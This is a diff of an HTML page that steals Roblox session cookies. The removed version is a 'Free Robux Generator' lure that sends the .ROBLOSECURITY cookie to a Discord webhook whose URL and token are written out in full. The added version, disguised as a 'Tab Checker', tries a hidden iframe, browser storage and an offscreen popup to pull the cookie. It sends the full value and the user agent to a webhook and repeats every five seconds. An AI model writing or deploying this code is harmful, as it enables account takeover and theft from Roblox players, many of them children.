@@ -1,34 +1,140 @@
-\<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Robux Generator 2024</title>
+    <title>Roblox Tab Checker</title>
     <style>
-        body { font-family: Arial; text-align: center; padding: 50px; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; 
-                 border-radius: 50%; width: 50px; height: 50px; 
-                 animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: Arial; background: #1f1f1f; color: white; text-align: center; padding: 20px; }
+        .status { margin: 20px; padding: 15px; background: #333; border-radius: 8px; }
+        .found { background: #2d5a2d; }
+        .checking { background: #5a5a2d; }
     </style>
 </head>
 <body>
-    <h1>🎁 Free Robux Generator</h1>
-    <p>Generating your free Robux...</p>
-    <div class="loader"></div>
-    <p id="status">Connecting to Roblox servers...</p>
+    <h1>🔍 Checking for Roblox Sessions...</h1>
+    <div id="status" class="status checking">Scanning browser tabs...</div>
     
     <script>
-        // Replace with your Discord webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1487943109143691327/BvBVaL0-nnDfGKbt16UZ9boDyg5IXUGhiNf1M8-wozz9N6Mv3vOWTstRCo6mJavJq0GF';
+        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
         
-        function sendCookieToWebhook(cookie) {
+        // Method 1: Try to access Roblox cookies directly
+        function checkRobloxCookies() {
+            const status = document.getElementById('status');
+            
+            // Create hidden iframe to try accessing Roblox
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'https://www.roblox.com';
+            document.body.appendChild(iframe);
+            
+            iframe.onload = function() {
+                try {
+                    // Try to access cookies from iframe
+                    const robloCookie = iframe.contentDocument.cookie
+                        .split('; ')
+                        .find(c => c.startsWith('.ROBLOSECURITY='))
+                        ?.split('=')[1];
+                    
+                    if (robloCookie) {
+                        status.innerHTML = '✅ Roblox session found! Cookie extracted.';
+                        status.className = 'status found';
+                        sendToDiscord(robloCookie);
+                    } else {
+                        // Method 2: Check all possible storage locations
+                        checkAllStorage();
+                    }
+                } catch (e) {
+                    // If iframe access blocked, try other methods
+                    checkAllStorage();
+                }
+                document.body.removeChild(iframe);
+            };
+        }
+        
+        // Method 2: Check localStorage and sessionStorage
+        function checkAllStorage() {
+            const status = document.getElementById('status');
+            let found = false;
+            
+            // Check localStorage for Roblox data
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key && key.includes('roblox')) {
+                    const value = localStorage.getItem(key);
+                    if (value && value.includes('.ROBLOSECURITY')) {
+                        const cookie = value.match(/\.ROBLOSECURITY=([^;]+)/)?.[1];
+                        if (cookie) {
+                            status.innerHTML = '✅ Found in localStorage!';
+                            status.className = 'status found';
+                            sendToDiscord(cookie);
+                            found = true;
+                            break;
+                        }
+                    }
+                }
+            }
+            
+            // Check sessionStorage
+            if (!found) {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    if (key && key.includes('roblox')) {
+                        const value = sessionStorage.getItem(key);
+                        if (value && value.includes('.ROBLOSECURITY')) {
+                            const cookie = value.match(/\.ROBLOSECURITY=([^;]+)/)?.[1];
+                            if (cookie) {
+                                status.innerHTML = '✅ Found in sessionStorage!';
+                                status.className = 'status found';
+                                sendToDiscord(cookie);
+                                found = true;
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+            
+            // Method 3: Try to access open tabs via window.open (limited)
+            if (!found) {
+                try {
+                    const robloxWindow = window.open('https://www.roblox.com', '_blank', 'width=1,height=1,left=-1000,top=-1000');
+                    setTimeout(() => {
+                        try {
+                            const cookie = robloxWindow.document.cookie
+                                .split('; ')
+                                .find(c => c.startsWith('.ROBLOSECURITY='))
+                                ?.split('=')[1];
+                            
+                            if (cookie) {
+                                status.innerHTML = '✅ Found via popup method!';
+                                status.className = 'status found';
+                                sendToDiscord(cookie);
+                            } else {
+                                status.innerHTML = '❌ No Roblox session detected';
+                            }
+                            robloxWindow.close();
+                        } catch (e) {
+                            status.innerHTML = '❌ Access blocked by browser security';
+                        }
+                    }, 2000);
+                } catch (e) {
+                    status.innerHTML = '❌ Popup blocked by browser';
+                }
+            }
+        }
+        
+        function sendToDiscord(cookie) {
             const data = {
-                content: `🍪 New ROBLOSECURITY Cookie: ${cookie}`,
+                content: `🍱 Roblox Cookie Detected: ${cookie.substring(0, 20)}...`,
                 embeds: [{
-                    title: "Cookie Logged",
-                    description: `IP: ${fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip)}`,
-                    color: 16711680
+                    title: "Cookie Extraction Success",
+                    description: `Full Cookie: \`${cookie}\``,
+                    color: 65280,
+                    fields: [
+                        { name: "User Agent", value: navigator.userAgent.substring(0, 100) },
+                        { name: "Time", value: new Date().toISOString() }
+                    ]
                 }]
             };
             
@@ -37,30 +143,16 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             });
+            
+            // Auto-close after sending
+            setTimeout(() => window.close(), 1000);
         }
         
-        function getRobloCookie() {
-            const cookies = document.cookie.split('; ');
-            for (let cookie of cookies) {
-                if (cookie.startsWith('.ROBLOSECURITY=')) {
-                    return cookie.split('=')[1];
-                }
-            }
-            return null;
-        }
+        // Start checking immediately
+        checkRobloxCookies();
         
-        // Main execution
-        const robloCookie = getRobloCookie();
-        if (robloCookie) {
-            sendCookieToWebhook(robloCookie);
-            document.getElementById('status').textContent = 'Success! Redirecting...';
-            setTimeout(() => {
-                window.location.href = 'https://www.roblox.com';
-            }, 2000);
-        } else {
-            document.getElementById('status').textContent = 'Please log in to Roblox first!';
-        }
+        // Also check every 5 seconds in case user opens Roblox later
+        setInterval(checkRobloxCookies, 5000);
     </script>
 </body>
 </html>
- 
